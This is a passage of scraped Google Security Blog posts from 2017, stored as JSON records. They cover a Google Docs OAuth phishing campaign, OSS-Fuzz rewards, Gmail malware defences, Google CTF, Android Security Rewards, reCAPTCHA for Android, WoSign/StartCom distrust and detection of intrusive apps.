from phishing attacks in a number of ways, including:      Using machine learning-based detection of spam and phishing messages, which has contributed to 99.9% accuracy in spam detection.&nbsp;   Providing  Safe Browsing  warnings about dangerous links, within Gmail and across more than 2 billion browsers.&nbsp;   Preventing suspicious account sign-ins through dynamic, risk-based challenges.&nbsp;   Scanning email attachments for malware and other dangerous payloads.&nbsp;      In addition, we&#8217;re taking multiple steps to combat this type of attack in the future, including updating our policies and enforcement on OAuth applications, updating our anti-spam systems to help prevent campaigns like this one, and augmenting monitoring of suspicious third-party apps that request information from our users.     How users can protect themselves&nbsp;     We&#8217;re committed to keeping your Google Account safe, and have layers of defense in place to guard against sophisticated attacks of all types, from anti-hijacking systems detecting unusual behavior, to machine learning models that block malicious content, to protection measures in Chrome and through Safe Browsing that guard against visiting suspicious sites. In addition, here are a few ways users can further protect themselves:       Take the  Google Security Checkup , paying particular attention to any applications or devices you no longer use, as well as any unrecognized devices.&nbsp;   Pay attention to  warnings and alerts  that appear in Gmail and other products.&nbsp;   Report  suspicious emails  and  other content  to Google.&nbsp;       How G Suite admins can protect their users&nbsp;     We&#8217;ve separately notified G Suite customers whose users were tricked into granting OAuth access. While no further admin or user action is required for this incident, if you are a G Suite admin, consider the following best practices to generally improve security:       Review and verify current  OAuth API access by third-parties .&nbsp;   Run  OAuth Token audit log reports  to catch future inadvertent scope grants and set up automated email alerts in the Admin console using the  custom alerts feature , or script it with the  Reports API .&nbsp;   Turn on 2-step verification for your organization and use  security keys .&nbsp;   Follow the  security checklist  if you feel that an account may be compromised.&nbsp;   Help prevent abuse of your brand in phishing attacks by publishing a  DMARC  policy for your organization.&nbsp;    Use  and enforce rules for  S/MIME encryption .    &nbsp;Here is a list of more  tips and tools  to help you stay secure on the web.                                          Posted by Mark Risher, Director, Counter Abuse Technology  As many email users know, phishing attacks—or emails that impersonate a trusted source to trick users into sharing information—are a pervasive problem. If you use Gmail, you can rest assured that every day, millions of phishing emails are blocked from ever reaching your inbox.  This week, we defended against an email phishing campaign that tricked some of our users into inadvertently granting access to their contact information, with the intent to spread more phishing emails. We took quick action to revoke all access granted to the attacker as well as steps to reduce and prevent harm from future variants of this type of attack.  Here’s some background to help you understand how the campaign worked, how we addressed it, and how you can better protect yourself against attacks.  How the campaign worked and how we addressed it   Victims of this attack received an email that appeared to be an invite to a Google Doc from one of their contacts. When users clicked the link in the attacker’s email, it directed them to the attacker’s application, which requested access to the user’s account under the false pretense of gaining access to the Google Doc. If the user authorized access to the application (through a mechanism called OAuth), it used the user's contact list to send the same message to more people.  Upon detecting this issue, we immediately responded with a combination of automatic and manual actions that ended this campaign within an hour. We removed fake pages and applications, and pushed user-protection updates through Safe Browsing, Gmail, Google Cloud Platform, and other counter-abuse systems. Fewer than 0.1% of our users were affected by this attack, and we have taken steps to re-secure affected accounts.  We protect our users from phishing attacks in a number of ways, including:   Using machine learning-based detection of spam and phishing messages, which has contributed to 99.9% accuracy in spam detection.  Providing Safe Browsing warnings about dangerous links, within Gmail and across more than 2 billion browsers.  Preventing suspicious account sign-ins through dynamic, risk-based challenges.  Scanning email attachments for malware and other dangerous payloads.    In addition, we’re taking multiple steps to combat this type of attack in the future, including updating our policies and enforcement on OAuth applications, updating our anti-spam systems to help prevent campaigns like this one, and augmenting monitoring of suspicious third-party apps that request information from our users.  How users can protect themselves   We’re committed to keeping your Google Account safe, and have layers of defense in place to guard against sophisticated attacks of all types, from anti-hijacking systems detecting unusual behavior, to machine learning models that block malicious content, to protection measures in Chrome and through Safe Browsing that guard against visiting suspicious sites. In addition, here are a few ways users can further protect themselves:   Take the Google Security Checkup, paying particular attention to any applications or devices you no longer use, as well as any unrecognized devices.  Pay attention to warnings and alerts that appear in Gmail and other products.  Report suspicious emails and other content to Google.    How G Suite admins can protect their users   We’ve separately notified G Suite customers whose users were tricked into granting OAuth access. While no further admin or user action is required for this incident, if you are a G Suite admin, consider the following best practices to generally improve security:   Review and verify current OAuth API access by third-parties.  Run OAuth Token audit log reports to catch future inadvertent scope grants and set up automated email alerts in the Admin console using the custom alerts feature, or script it with the Reports API.  Turn on 2-step verification for your organization and use security keys.  Follow the security checklist if you feel that an account may be compromised.  Help prevent abuse of your brand in phishing attacks by publishing a DMARC policy for your organization.  Use and enforce rules for S/MIME encryption.   Here is a list of more tips and tools to help you stay secure on the web.       ", "date": "May 5, 2017"},
{"website": "Google-Security", "title": "\nOSS-Fuzz: Five months later, and rewarding projects\n", "author": ["Posted by Oliver Chang, Abhishek Arya (Security Engineers, Chrome Security), Kostya Serebryany (Software Engineer, Dynamic Tools), and Josh Armour (Security Program Manager)"], "link": "https://security.googleblog.com/2017/05/oss-fuzz-five-months-later-and.html", "abstract": "                             Posted by Oliver Chang, Abhishek Arya (Security Engineers, Chrome Security), Kostya Serebryany (Software Engineer, Dynamic Tools), and Josh Armour (Security Program Manager)     Five months ago, we  announced   OSS-Fuzz , Google&#8217;s effort to help make open source software more secure and stable. Since then, our robot army has been working hard at  fuzzing , processing 10 trillion test inputs a day. Thanks to the efforts of the open source community who have integrated a total of  47  projects, we&#8217;ve found over  1,000  bugs ( 264  of which are potential security vulnerabilities).                   Breakdown of the types of bugs we&#8217;re finding               Notable results&nbsp;      OSS-Fuzz has found numerous security vulnerabilities in several critical open source projects:  10  in FreeType2,  17  in FFmpeg,  33  in LibreOffice,  8  in SQLite 3,  10  in GnuTLS,  25  in PCRE2,  9  in gRPC, and  7  in Wireshark. We&#8217;ve also had at least one bug collision with another independent security researcher (CVE-2017-2801). (Some of the bugs are still view-restricted so links may show smaller numbers.)    Once a project is integrated into OSS-Fuzz, the continuous and automated nature of OSS-Fuzz means that we often catch these issues just hours after the regression is introduced into the upstream repository, so that the chances of users being affected is reduced.    Fuzzing not only finds memory safety related bugs, it can also find correctness or logic bugs. One example is a carry propagating bug in OpenSSL ( CVE-2017-3732 ).    Finally, OSS-Fuzz has reported over 300  timeout and out-of-memory failures  (~75% of which got fixed). Not every project treats these as bugs, but fixing them enables OSS-Fuzz to find more interesting bugs.      Announcing rewards for open source projects&nbsp;      We believe that user and internet security as a whole can benefit greatly if more open source projects include fuzzing in their development process. To this end, we&#8217;d like to encourage more projects to participate and adopt the  ideal integration  guidelines that we&#8217;ve established.    Combined with fixing all the issues that are found, this is often a significant amount of work for developers who may be working on an open source project in their spare time. To support these projects, we are expanding our existing  Patch Rewards  program to include rewards for the integration of  fuzz targets  into OSS-Fuzz.    To qualify for these rewards, a project needs to have a large user base and/or be critical to global IT infrastructure. Eligible projects will receive $1,000 for initial integration, and up to $20,000 for ideal integration (the final amount is at our discretion). You have the option of donating these rewards to charity instead, and Google will double the amount.    To qualify for the ideal integration reward, projects must show that:       Fuzz targets are checked into their upstream repository and integrated in the build system with  sanitizer  support (up to $5,000).&nbsp;   Fuzz targets are  efficient  and provide good code coverage (&gt;80%) (up to $5,000).&nbsp;   Fuzz targets are part of the official upstream development and regression testing process, i.e. they are maintained, run against old known crashers and the periodically updated  corpora  (up to $5,000).&nbsp;   The last $5,000 is a &#8220; l33t &#8221; bonus that we may reward at our discretion for projects that we feel have gone the extra mile or done something really awesome.&nbsp;    We&#8217;ve already started to contact the first round of projects that are eligible for the initial reward. If you are the maintainer or point of contact for one of these projects, you may also  reach out  to us in order to apply for our ideal integration rewards.      The future&nbsp;      We&#8217;d like to thank the existing contributors who integrated their projects and fixed countless bugs. We hope to see more projects integrated into OSS-Fuzz, and greater adoption of fuzzing as standard practice when developing software.                                   Posted by Oliver Chang, Abhishek Arya (Security Engineers, Chrome Security), Kostya Serebryany (Software Engineer, Dynamic Tools), and Josh Armour (Security Program Manager)  Five months ago, we announced OSS-Fuzz, Google’s effort to help make open source software more secure and stable. Since then, our robot army has been working hard at fuzzing, processing 10 trillion test inputs a day. Thanks to the efforts of the open source community who have integrated a total of 47 projects, we’ve found over 1,000 bugs (264 of which are potential security vulnerabilities).    Breakdown of the types of bugs we’re finding    Notable results   OSS-Fuzz has found numerous security vulnerabilities in several critical open source projects: 10 in FreeType2, 17 in FFmpeg, 33 in LibreOffice, 8 in SQLite 3, 10 in GnuTLS, 25 in PCRE2, 9 in gRPC, and 7 in Wireshark. We’ve also had at least one bug collision with another independent security researcher (CVE-2017-2801). (Some of the bugs are still view-restricted so links may show smaller numbers.)  Once a project is integrated into OSS-Fuzz, the continuous and automated nature of OSS-Fuzz means that we often catch these issues just hours after the regression is introduced into the upstream repository, so that the chances of users being affected is reduced.  Fuzzing not only finds memory safety related bugs, it can also find correctness or logic bugs. One example is a carry propagating bug in OpenSSL (CVE-2017-3732).  Finally, OSS-Fuzz has reported over 300 timeout and out-of-memory failures (~75% of which got fixed). Not every project treats these as bugs, but fixing them enables OSS-Fuzz to find more interesting bugs.  Announcing rewards for open source projects   We believe that user and internet security as a whole can benefit greatly if more open source projects include fuzzing in their development process. To this end, we’d like to encourage more projects to participate and adopt the ideal integration guidelines that we’ve established.  Combined with fixing all the issues that are found, this is often a significant amount of work for developers who may be working on an open source project in their spare time. To support these projects, we are expanding our existing Patch Rewards program to include rewards for the integration of fuzz targets into OSS-Fuzz.  To qualify for these rewards, a project needs to have a large user base and/or be critical to global IT infrastructure. Eligible projects will receive $1,000 for initial integration, and up to $20,000 for ideal integration (the final amount is at our discretion). You have the option of donating these rewards to charity instead, and Google will double the amount.  To qualify for the ideal integration reward, projects must show that:   Fuzz targets are checked into their upstream repository and integrated in the build system with sanitizer support (up to $5,000).  Fuzz targets are efficient and provide good code coverage (>80%) (up to $5,000).  Fuzz targets are part of the official upstream development and regression testing process, i.e. they are maintained, run against old known crashers and the periodically updated corpora (up to $5,000).  The last $5,000 is a “l33t” bonus that we may reward at our discretion for projects that we feel have gone the extra mile or done something really awesome.   We’ve already started to contact the first round of projects that are eligible for the initial reward. If you are the maintainer or point of contact for one of these projects, you may also reach out to us in order to apply for our ideal integration rewards.  The future   We’d like to thank the existing contributors who integrated their projects and fixed countless bugs. We hope to see more projects integrated into OSS-Fuzz, and greater adoption of fuzzing as standard practice when developing software.     ", "date": "May 8, 2017"},
{"website": "Google-Security", "title": "\nNew Built-In Gmail Protections to Combat Malware in Attachments\n", "author": ["Posted by Sri Somanchi, Product Manager, Gmail anti-spam"], "link": "https://security.googleblog.com/2017/05/new-built-in-gmail-protections-to.html", "abstract": "                             Posted by Sri Somanchi, Product Manager, Gmail anti-spam   Today we announced  new security features for Gmail customers , including early phishing detection using machine learning, click-time warnings for malicious links, and unintended external reply warnings. In addition, we have also updated our defenses against malicious attachments.    Let&#8217;s take a deeper look at the new defenses against malicious attachments. We now correlate spam signals with attachment and sender heuristics, to predict messages containing new and unseen malware variants. These protections enable Gmail to better protect our users from zero-day threats, ransomware and polymorphic malware.    In addition, we  block  use of file types that carry a high potential for security risks including executable and javascript files.    Machine learning has helped Gmail achieve more than 99% accuracy in spam detection, and with these new protections, we&#8217;re able to reduce your exposure to threats by confidently rejecting hundreds of millions of additional messages every day.   Constantly improving our automatic protections     These new changes are just the latest in our ongoing work to improve our protections as we work to keep ahead of evolving threats. For many years, scammers have tried to use dodgy email attachments to sneak past our spam filters, and we&#8217;ve long blocked this potential abuse in a variety of  ways , including:       Rejecting the message and notifying the sender if we detect a virus in an email.   Preventing you from sending a message with an infected attachment.   Preventing you from downloading attachments if we detect a virus.    While the bad guys never rest, neither do we.     These protections were made possible due to extensive contribution from Vijay Eranti &amp; Timothy Schumacher (Gmail anti-spam) &amp; Harish Gudelly (Google anti-virus) &amp; Lucio Tudisco (G Suite anti-abuse)                                         Posted by Sri Somanchi, Product Manager, Gmail anti-spam Today we announced new security features for Gmail customers, including early phishing detection using machine learning, click-time warnings for malicious links, and unintended external reply warnings. In addition, we have also updated our defenses against malicious attachments.  Let’s take a deeper look at the new defenses against malicious attachments. We now correlate spam signals with attachment and sender heuristics, to predict messages containing new and unseen malware variants. These protections enable Gmail to better protect our users from zero-day threats, ransomware and polymorphic malware.  In addition, we block use of file types that carry a high potential for security risks including executable and javascript files.  Machine learning has helped Gmail achieve more than 99% accuracy in spam detection, and with these new protections, we’re able to reduce your exposure to threats by confidently rejecting hundreds of millions of additional messages every day. Constantly improving our automatic protections  These new changes are just the latest in our ongoing work to improve our protections as we work to keep ahead of evolving threats. For many years, scammers have tried to use dodgy email attachments to sneak past our spam filters, and we’ve long blocked this potential abuse in a variety of ways, including:   Rejecting the message and notifying the sender if we detect a virus in an email. Preventing you from sending a message with an infected attachment. Preventing you from downloading attachments if we detect a virus.  While the bad guys never rest, neither do we.  These protections were made possible due to extensive contribution from Vijay Eranti & Timothy Schumacher (Gmail anti-spam) & Harish Gudelly (Google anti-virus) & Lucio Tudisco (G Suite anti-abuse)       ", "date": "May 31, 2017"},
{"website": "Google-Security", "title": "\nAnnouncing Google Capture the Flag 2017\n", "author": ["Posted by Josh Armour Security Program Manager"], "link": "https://security.googleblog.com/2017/06/announcing-google-capture-flag-2017.html", "abstract": "                             Posted by Josh Armour Security Program Manager     On 00:00:01 UTC of June 17th and 18th, 2017 we&#8217;ll be hosting the  online qualification round  of our second annual Capture The Flag (CTF) competition. In a &#8216;Capture the Flag&#8217; competition we create security challenges and puzzles in which contestants can earn points for solving them. We will be inviting the top 10 finalist teams to a  secret undisclosed location  (spoiler alert:  it&#8217;s Google ) to compete onsite for a prize pool of over USD$31,337 and we&#8217;ll help subsidize travel to the venue for the finals to four participants for each of the ten finalist teams. In addition to grand prizes given at the finals, we&#8217;ll be rewarding some of the best and creative  write-ups  that we receive during the qualifying round. We want to give you an opportunity to share with the world the clever way you solve challenges.       Why do we host these competitions?       There are three main reasons why we host these competitions.    First, as we've seen with our  Vulnerability Reward Program , the security community&#8217;s efforts help us better protect Google users, and the web as a whole. We&#8217;d like to give the people who solve a single challenge or two in a very clever way a chance to teach us and the security community, even if they don&#8217;t qualify for the finals. We also think that these challenges allows us to share with the world the types of problems our security team works on every day.    Second, we want to engage the broader security community and reach out to as many people involved as possible. At the  Google CTF  last year the winning team, &#8216; Pasten &#8217; from Israel, earned over 4,700 points competing against 2,400 teams out of which 900 were able to solve at least one of our challenges. Thanks to the community's feedback, we used what we learned last year to make our CTF even better this time.             Lastly, we also want to grow the security community. Upon observing how last year's competition engaged new players from all over the world, we want to continue to create a safe space for people to come and learn while trying to solve challenges and having fun. Our internal security team employs several people who actively compete in CTF competitions in their spare time, so we value this activity and want to give back to and help grow our community.    We hope to virtually see you at the 2nd annual Google CTF on June 17th at 00:00:01 UTC. Check  this site (g.co/ctf)  for more details, as they become available.       The Big Picture       At Google, we aim to reward the hard work of hackers and security researchers. One such avenue is our Google Vulnerability Rewards Programs. Many of the best bug hunters enjoy participating in &#8216;Capture The Flag&#8217; contests, and great vulnerabilities have been discovered and  disclosed at them . During last year's Google CTF we also received some security bug reports in our scoreboard, for which we gave out rewards under the VRP. Another way we reward this community is with our  Vulnerability Research Grants Program  and our  Patch Rewards Program . We look forward to the best contestants taking some time to explore our other programs for opportunities to make some money and help improve the security of the internet.                                        Posted by Josh Armour Security Program Manager  On 00:00:01 UTC of June 17th and 18th, 2017 we’ll be hosting the online qualification round of our second annual Capture The Flag (CTF) competition. In a ‘Capture the Flag’ competition we create security challenges and puzzles in which contestants can earn points for solving them. We will be inviting the top 10 finalist teams to a secret undisclosed location (spoiler alert: it’s Google) to compete onsite for a prize pool of over USD$31,337 and we’ll help subsidize travel to the venue for the finals to four participants for each of the ten finalist teams. In addition to grand prizes given at the finals, we’ll be rewarding some of the best and creative write-ups that we receive during the qualifying round. We want to give you an opportunity to share with the world the clever way you solve challenges.  Why do we host these competitions?  There are three main reasons why we host these competitions.  First, as we've seen with our Vulnerability Reward Program, the security community’s efforts help us better protect Google users, and the web as a whole. We’d like to give the people who solve a single challenge or two in a very clever way a chance to teach us and the security community, even if they don’t qualify for the finals. We also think that these challenges allows us to share with the world the types of problems our security team works on every day.  Second, we want to engage the broader security community and reach out to as many people involved as possible. At the Google CTF last year the winning team, ‘Pasten’ from Israel, earned over 4,700 points competing against 2,400 teams out of which 900 were able to solve at least one of our challenges. Thanks to the community's feedback, we used what we learned last year to make our CTF even better this time.     Lastly, we also want to grow the security community. Upon observing how last year's competition engaged new players from all over the world, we want to continue to create a safe space for people to come and learn while trying to solve challenges and having fun. Our internal security team employs several people who actively compete in CTF competitions in their spare time, so we value this activity and want to give back to and help grow our community.  We hope to virtually see you at the 2nd annual Google CTF on June 17th at 00:00:01 UTC. Check this site (g.co/ctf) for more details, as they become available.  The Big Picture  At Google, we aim to reward the hard work of hackers and security researchers. One such avenue is our Google Vulnerability Rewards Programs. Many of the best bug hunters enjoy participating in ‘Capture The Flag’ contests, and great vulnerabilities have been discovered and disclosed at them. During last year's Google CTF we also received some security bug reports in our scoreboard, for which we gave out rewards under the VRP. Another way we reward this community is with our Vulnerability Research Grants Program and our Patch Rewards Program. We look forward to the best contestants taking some time to explore our other programs for opportunities to make some money and help improve the security of the internet.      ", "date": "June 2, 2017"},
{"website": "Google-Security", "title": "\n2017 Android Security Rewards\n", "author": ["Posted by Mayank Jain and Scott Roberts, Android Security team"], "link": "https://security.googleblog.com/2017/06/2017-android-security-rewards.html", "abstract": "                             Posted by Mayank Jain and Scott Roberts, Android Security team      [Cross-posted from the  Android Developers Blog ]     Two years ago, we launched the  Android Security Rewards program . In its second year, we've seen great progress. We received over 450 qualifying vulnerability reports from researchers and the average pay per researcher jumped by 52.3%. On top of that, the total Android Security Rewards payout doubled to $1.1 million dollars. Since it launched, we've rewarded researchers over $1.5 million dollars.    Here are some of the highlights from the Android Security Rewards program's second year:     There were no payouts for the top reward for a complete remote exploit chain leading to TrustZone or Verified Boot compromise, our highest award amount possible.   We paid 115 individuals with an average of $2,150 per reward and $10,209 per researcher.   We paid our top research team,  C0RE Team , over $300,000 for 118 vulnerability reports.   We paid 31 researchers $10,000 or more.    Thank you to all the amazing  researchers  who submitted complete  vulnerability reports  to us last year.     Improvements to Android Security Rewards program     We&#8217;re constantly working to improve the Android Security Rewards program and today we&#8217;re making a few changes to all vulnerability reports filed after June 1, 2017.    Because every Android release includes more security protections and no researcher has claimed the top reward for an exploit chains in 2 years, we&#8217;re excited to increase our top-line payouts for these exploits.     Rewards for a remote exploit chain or exploit leading to TrustZone or Verified Boot compromise increase from $50,000 to $200,000.   Rewards for a remote kernel exploit increase from $30,000 to $150,000.    In addition to rewarding for vulnerabilities, we continue to work with the broad and diverse Android ecosystem to protect users from issues reported through our program. We collaborate with manufacturers to ensure that these issues are fixed on their devices through monthly  security updates . Over 100 device models have a majority of their deployed devices running a security update from the last 90 days. This table shows the models with a majority of deployed devices running a security update from the last two months:                    Manufacturer         Device            BlackBerry        PRIV           Fujitsu        F-01J           General Mobile        GM5 Plus d, GM5 Plus, General Mobile 4G Dual, General Mobile 4G           Gionee        A1           Google        Pixel XL, Pixel, Nexus 6P, Nexus 6, Nexus 5X, Nexus 9           LGE        LG G6, V20, Stylo 2 V, GPAD 7.0 LTE           Motorola        Moto Z, Moto Z Droid           Oppo        CPH1613, CPH1605           Samsung        Galaxy S8+, Galaxy S8, Galaxy S7, Galaxy S7 Edge, Galaxy S7 Active, Galaxy S6 Active, Galaxy S5 Dual SIM, Galaxy C9 Pro, Galaxy C7, Galaxy J7, Galaxy On7 Pro, Galaxy J2, Galaxy A8, Galaxy Tab S2 9.7           Sharp        Android One S1, 507SH           Sony        Xperia XA1, Xperia X           Vivo        Vivo 1609, Vivo 1601, Vivo Y55             Source  : Google, May 29, 2017         Thank you to everyone who helped make Android safer and stronger in the past year. Together, we made a huge investment in security research that helps Android users everywhere. If you want to get involved to make next year even better, check out our detailed  Program Rules . For tips on how to submit complete reports, see  Bug Hunter University .                                    Posted by Mayank Jain and Scott Roberts, Android Security team  [Cross-posted from the Android Developers Blog]  Two years ago, we launched the Android Security Rewards program. In its second year, we've seen great progress. We received over 450 qualifying vulnerability reports from researchers and the average pay per researcher jumped by 52.3%. On top of that, the total Android Security Rewards payout doubled to $1.1 million dollars. Since it launched, we've rewarded researchers over $1.5 million dollars.  Here are some of the highlights from the Android Security Rewards program's second year:  There were no payouts for the top reward for a complete remote exploit chain leading to TrustZone or Verified Boot compromise, our highest award amount possible. We paid 115 individuals with an average of $2,150 per reward and $10,209 per researcher. We paid our top research team, C0RE Team, over $300,000 for 118 vulnerability reports. We paid 31 researchers $10,000 or more.  Thank you to all the amazing researchers who submitted complete vulnerability reports to us last year.  Improvements to Android Security Rewards program  We’re constantly working to improve the Android Security Rewards program and today we’re making a few changes to all vulnerability reports filed after June 1, 2017.  Because every Android release includes more security protections and no researcher has claimed the top reward for an exploit chains in 2 years, we’re excited to increase our top-line payouts for these exploits.  Rewards for a remote exploit chain or exploit leading to TrustZone or Verified Boot compromise increase from $50,000 to $200,000. Rewards for a remote kernel exploit increase from $30,000 to $150,000.  In addition to rewarding for vulnerabilities, we continue to work with the broad and diverse Android ecosystem to protect users from issues reported through our program. We collaborate with manufacturers to ensure that these issues are fixed on their devices through monthly security updates. Over 100 device models have a majority of their deployed devices running a security update from the last 90 days. This table shows the models with a majority of deployed devices running a security update from the last two months:     Manufacturer   Device    BlackBerry  PRIV   Fujitsu  F-01J   General Mobile  GM5 Plus d, GM5 Plus, General Mobile 4G Dual, General Mobile 4G   Gionee  A1   Google  Pixel XL, Pixel, Nexus 6P, Nexus 6, Nexus 5X, Nexus 9   LGE  LG G6, V20, Stylo 2 V, GPAD 7.0 LTE   Motorola  Moto Z, Moto Z Droid   Oppo  CPH1613, CPH1605   Samsung  Galaxy S8+, Galaxy S8, Galaxy S7, Galaxy S7 Edge, Galaxy S7 Active, Galaxy S6 Active, Galaxy S5 Dual SIM, Galaxy C9 Pro, Galaxy C7, Galaxy J7, Galaxy On7 Pro, Galaxy J2, Galaxy A8, Galaxy Tab S2 9.7   Sharp  Android One S1, 507SH   Sony  Xperia XA1, Xperia X   Vivo  Vivo 1609, Vivo 1601, Vivo Y55    Source: Google, May 29, 2017  Thank you to everyone who helped make Android safer and stronger in the past year. Together, we made a huge investment in security research that helps Android users everywhere. If you want to get involved to make next year even better, check out our detailed Program Rules. For tips on how to submit complete reports, see Bug Hunter University.     ", "date": "June 1, 2017"},
{"website": "Google-Security", "title": "\nMaking the Internet safer and faster: Introducing reCAPTCHA Android API\n", "author": ["Posted by Wei Liu, Product Manager, reCAPTCHA"], "link": "https://security.googleblog.com/2017/06/making-internet-safer-and-faster.html", "abstract": "                             Posted by Wei Liu,&nbsp;Product Manager, reCAPTCHA   When we launched reCAPTCHA ten years ago, we had a simple goal: enable users to visit the sites they love without worrying about spam and abuse. Over the years, reCAPTCHA has changed quite a bit. It evolved from the distorted text to  street numbers  and names, then  No CAPTCHA reCAPTCHA  in 2014 and Invisible reCAPTCHA in March this year.           By now, more than a billion users have benefited from reCAPTCHA and we continue to work to refine our protections.    reCAPTCHA protects users wherever they may be online. As the use of mobile devices has grown rapidly, it&#8217;s important to keep the mobile applications and data safe. Today, on reCAPTCHA&#8217;s tenth birthday, we&#8217;re glad to announce the first reCAPTCHA  Android API  as part of Google Play Services.    With this API, reCAPTCHA can better tell human and bots apart to provide a streamlined user experience on mobile. It will use our newest Invisible reCAPTCHA technology, which runs risk analysis behind the scene and has enabled millions of human users to pass through with zero click everyday. Now mobile users can enjoy their apps without being interrupted, while still staying away from spam and abuse.             reCAPTCHA Android API is included with Google  SafetyNet , which provides services like device attestation and safe browsing to protect mobile apps. Mobile developers can do both the device and user attestations in the same API to mitigate security risks of their apps more efficiently. This adds to the  diversity of security protections  on Android:  Google Play Protect  to monitor for potentially harmful applications, device encryption, and regular security updates. Please  visit our site  to learn more about how to integrate with the reCAPTCHA Android API, and keep an eye out for our iOS library.    The journey of reCAPTCHA continues: we&#8217;ll make the Internet safer and easier to use for everyone (except bots).                                   Posted by Wei Liu, Product Manager, reCAPTCHA When we launched reCAPTCHA ten years ago, we had a simple goal: enable users to visit the sites they love without worrying about spam and abuse. Over the years, reCAPTCHA has changed quite a bit. It evolved from the distorted text to street numbers and names, then No CAPTCHA reCAPTCHA in 2014 and Invisible reCAPTCHA in March this year.   By now, more than a billion users have benefited from reCAPTCHA and we continue to work to refine our protections.  reCAPTCHA protects users wherever they may be online. As the use of mobile devices has grown rapidly, it’s important to keep the mobile applications and data safe. Today, on reCAPTCHA’s tenth birthday, we’re glad to announce the first reCAPTCHA Android API as part of Google Play Services.  With this API, reCAPTCHA can better tell human and bots apart to provide a streamlined user experience on mobile. It will use our newest Invisible reCAPTCHA technology, which runs risk analysis behind the scene and has enabled millions of human users to pass through with zero click everyday. Now mobile users can enjoy their apps without being interrupted, while still staying away from spam and abuse.     reCAPTCHA Android API is included with Google SafetyNet, which provides services like device attestation and safe browsing to protect mobile apps. Mobile developers can do both the device and user attestations in the same API to mitigate security risks of their apps more efficiently. This adds to the diversity of security protections on Android: Google Play Protect to monitor for potentially harmful applications, device encryption, and regular security updates. Please visit our site to learn more about how to integrate with the reCAPTCHA Android API, and keep an eye out for our iOS library.  The journey of reCAPTCHA continues: we’ll make the Internet safer and easier to use for everyone (except bots).     ", "date": "June 9, 2017"},
{"website": "Google-Security", "title": "\nFinal removal of trust in WoSign and StartCom Certificates\n", "author": ["Posted by Andrew Whalley and Devon O'Brien, Chrome Security"], "link": "https://security.googleblog.com/2017/07/final-removal-of-trust-in-wosign-and.html", "abstract": "                             Posted by Andrew Whalley and Devon O'Brien, Chrome Security     As  previously announced , Chrome has been in the process of removing trust from certificates issued by the CA WoSign and its subsidiary StartCom, as a result of several incidents not in keeping with the high standards expected of CAs.    We started the phase out in Chrome 56 by only trusting certificates issued prior to October 21st 2016, and subsequently restricted trust to a set of whitelisted hostnames based on the Alexa Top 1M. We have been reducing the size of the whitelist over the course of several Chrome releases.    Beginning with Chrome 61, the whitelist will be removed, resulting in full distrust of the existing WoSign and StartCom root certificates and all certificates they have issued.    Based on the  Chromium Development Calendar , this change is visible in the  Chrome Dev channel  now, the Chrome Beta channel around late July 2017, and will be released to Stable around mid September 2017.    Sites still using StartCom or WoSign-issued certificates should consider replacing these certificates as a matter of urgency to minimize disruption for Chrome users.                                    Posted by Andrew Whalley and Devon O'Brien, Chrome Security  As previously announced, Chrome has been in the process of removing trust from certificates issued by the CA WoSign and its subsidiary StartCom, as a result of several incidents not in keeping with the high standards expected of CAs.  We started the phase out in Chrome 56 by only trusting certificates issued prior to October 21st 2016, and subsequently restricted trust to a set of whitelisted hostnames based on the Alexa Top 1M. We have been reducing the size of the whitelist over the course of several Chrome releases.  Beginning with Chrome 61, the whitelist will be removed, resulting in full distrust of the existing WoSign and StartCom root certificates and all certificates they have issued.  Based on the Chromium Development Calendar, this change is visible in the Chrome Dev channel now, the Chrome Beta channel around late July 2017, and will be released to Stable around mid September 2017.  Sites still using StartCom or WoSign-issued certificates should consider replacing these certificates as a matter of urgency to minimize disruption for Chrome users.     ", "date": "July 20, 2017"},
{"website": "Google-Security", "title": "\nIdentifying Intrusive Mobile Apps Using Peer Group Analysis\n", "author": ["Posted by Martin Pelikan, Giles Hogben, and Ulfar Erlingsson of Google’s Security and Privacy team"], "link": "https://security.googleblog.com/2017/07/identifying-intrusive-mobile-apps-using.html", "abstract": "                             Posted by Martin Pelikan, Giles Hogben, and Ulfar Erlingsson of Google&#8217;s Security and Privacy team    Mobile apps entertain and assist us, make it easy to communicate with friends and family, and provide tools ranging from maps to electronic wallets. But these apps could also seek more device information than they need to do their job, such as personal data and sensor data from components, like cameras and GPS trackers.    To protect our users and help developers navigate this complex environment, Google analyzes privacy and security signals for each app in Google Play. We then compare that app to other apps with similar features, known as functional peers. Creating peer groups allows us to calibrate our estimates of users&#8217; expectations and set adequate boundaries of behaviors that may be considered unsafe or intrusive. This process helps detect apps that collect or send sensitive data without a clear need, and makes it easier for users to find apps that provide the right functionality and respect their privacy. For example, most coloring book apps don&#8217;t need to know a user&#8217;s precise location to function and this can be established by analyzing other coloring book apps. By contrast, mapping and navigation apps need to know a user&#8217;s location, and often require GPS sensor access.    One way to create app peer groups is to create a fixed set of categories and then assign each app into one or more categories, such as tools, productivity, and games. However, fixed categories are too coarse and inflexible to capture and track the many distinctions in the rapidly changing set of mobile apps. Manual curation and maintenance of such categories is also a tedious and error-prone task.    To address this, Google developed a machine-learning algorithm for clustering mobile apps with similar capabilities. Our approach uses deep learning of vector embeddings to identify peer groups of apps with similar functionality, using app metadata, such as text descriptions, and user metrics, such as installs. Then peer groups are used to identify anomalous, potentially harmful signals related to privacy and security, from each app&#8217;s requested permissions and its observed behaviors. The correlation between different peer groups and their security signals helps different teams at Google decide which apps to promote and determine which apps deserve a more careful look by our security and privacy experts. We also use the result to help app developers improve the privacy and security of their apps.              Apps are split into groups of similar functionality, and in each cluster of similar apps the established baseline is used to find anomalous privacy and security signals.     These techniques build upon earlier ideas, such as using  peer groups  to analyze privacy-related signals,  deep learning for language models  to make those peer groups better, and  automated data analysis  to draw conclusions.    Many teams across Google collaborated to create this algorithm and the surrounding process. Thanks to several, essential team members including Andrew Ahn, Vikas Arora, Hongji Bao, Jun Hong, Nwokedi Idika, Iulia Ion, Suman Jana, Daehwan Kim, Kenny Lim, Jiahui Liu, Sai Teja Peddinti, Sebastian Porst, Gowdy Rajappan, Aaron Rothman, Monir Sharif, Sooel Son, Michael Vrable, and Qiang Yan.    For more information on Google&#8217;s efforts to detect and fight potentially harmful apps (PHAs) on Android, see  Google Android Security Team&#8217;s Classifications for Potentially Harmful Applications .   References     S. Jana, Ú. Erlingsson, I. Ion (2015).  Apples and Oranges: Detecting Least-Privilege Violators with Peer Group Analysis . arXiv:1510.07308 [cs.CR].    T. Mikolov, I. Sutskever, K. Chen, G. S. Corrado, J. Dean (2013).  Distributed Representations of Words and Phrases and their Compositionality . Advances in Neural Information Processing Systems 26 (NIPS 2013).    Ú. Erlingsson 